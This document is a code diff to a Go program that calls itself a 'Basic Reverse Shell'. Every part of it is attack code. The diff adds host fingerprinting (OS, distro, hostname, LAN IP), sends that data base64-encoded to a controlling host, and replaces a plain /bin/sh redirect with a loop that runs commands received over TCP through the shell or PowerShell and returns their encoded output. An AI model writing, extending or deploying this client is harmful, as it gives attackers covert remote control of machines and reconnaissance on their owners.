@@ -3,6 +3,7 @@ package main
 
 import (
 	"bufio"
+	"encoding/base64"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -10,6 +11,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"runtime"
 	"strconv"
 	"strings"
 )
@@ -68,8 +70,29 @@ func GetPort() string {
 		return "-1"
 	}
 	defer getPort.Close()
-	ip := GetOutboundIP()
-	it, err := getPort.Write([]byte(ip + "\n"))
+	// ip := GetOutboundIP()
+	osFlavor := "n/a"
+	// TODO: add OS flavor
+	if runtime.GOOS == "linux" {
+		osFlavor = getOS()
+	} else if runtime.GOOS == "windows" {
+		cmd := exec.Command("wmic", "os", "get", "Caption")
+		out, _ := cmd.Output()
+		osFlavor = string(out)
+		osFlavor = osFlavor[strings.Index(osFlavor, "\n")+1:]
+		osFlavor = trim(osFlavor[:strings.Index(osFlavor, "\n")])
+		cmd.Run()
+	}
+	hostname, _ := os.Hostname()
+	sendStr := b64_encode(
+		"clientType:Basic Reverse Shell," +
+			"lanIP:" + GetOutboundIP() + "," +
+			"isEncoded:true" + "," +
+			"os:" + runtime.GOOS + "," +
+			"osFlavor:" + osFlavor + "," +
+			"hostname:" + hostname,
+	)
+	it, err := getPort.Write([]byte("INFO:{" + sendStr + "}\n"))
 	if err != nil {
 		fmt.Println(err.Error())
 		fmt.Println(it)
@@ -79,13 +102,30 @@ func GetPort() string {
 }
 func EstablishConnection(port string) {
 	//Establish reverse connection to host
-	con, _ := net.Dial("tcp", HOST_CONNECT+port)
-	cmd := exec.Command("/bin/sh")
-	//Set input/output to the established connection's in/out
-	cmd.Stdin = con
-	cmd.Stdout = con
-	cmd.Stderr = con
-	cmd.Run()
+	conn, _ := net.Dial("tcp", HOST_CONNECT+port)
+	var cmd *exec.Cmd
+	reader := bufio.NewReader(conn)
+	for {
+		command, err := reader.ReadString('\n')
+		if err != nil {
+			return
+		}
+		command = trim(command)
+		args := strings.Split(command, " ")
+		if args[0] == "cd" {
+			os.Chdir(trim(command[3:]))
+			conn.Write([]byte("\n"))
+		} else {
+			if runtime.GOOS == "windows" {
+				cmd = exec.Command("powershell.exe", command)
+			} else {
+				cmd = exec.Command(args[0], args[1:]...)
+			}
+			out, _ := cmd.CombinedOutput()
+			conn.Write([]byte(b64_encode(string(out)) + "\n"))
+			cmd.Run()
+		}
+	}
 }
 
 func CheckFileExists(file string) bool {
@@ -143,4 +183,56 @@ func GetOutboundIP() string {
 	ip := localAddr.IP
 	ipstr := ip.String()
 	return ipstr
+}
+
+func getOS(isFail ...bool) string {
+	var ret_os string
+	checkID := false
+	//Nifty little code to let us call getOS with or without a parameter
+	if len(isFail) > 0 && isFail[0] {
+		checkID = true
+	}
+	//Read /etc/os-release to find what distro the host is running on
+	os_str := readFile("/etc/os-release")
+	os_split := strings.Split(os_str, "\n")
+	for i := 0; i < len(os_split); i++ {
+		//Child distros will have ID_LIKE instead of ID. Check for both
+		matchString := "ID_LIKE="
+		if checkID {
+			matchString = "ID="
+		}
+		if strings.Index(os_split[i], matchString) == 0 {
+			ret_os = strings.Replace(os_split[i], matchString, "", 1)
+			ret_os = strings.Replace(ret_os, `"`, "", -1)
+			break
+		}
+	}
+	if ret_os == "" && !checkID {
+		// If ID_LIKE wasn't found, then seach for ID= instead
+		return getOS(true)
+	}
+	return ret_os
+}
+func trim(str string) string {
+	return strings.TrimSuffix(strings.TrimSuffix(str, "\n"), "\r")
+}
+func readFile(path string) string {
+	dat, _ := ioutil.ReadFile(path)
+	str := string(dat)
+	return str
+}
+func b64_encode(text string) string {
+	encoded := base64.StdEncoding.EncodeToString([]byte(text))
+	return encoded
+}
+
+/**
+base 64 decode a message from the server
+*/
+func b64_decode(text string) string {
+	decoded, err := base64.StdEncoding.DecodeString(text)
+	if err != nil {
+		fmt.Println(err)
+	}
+	return string(decoded)
 }
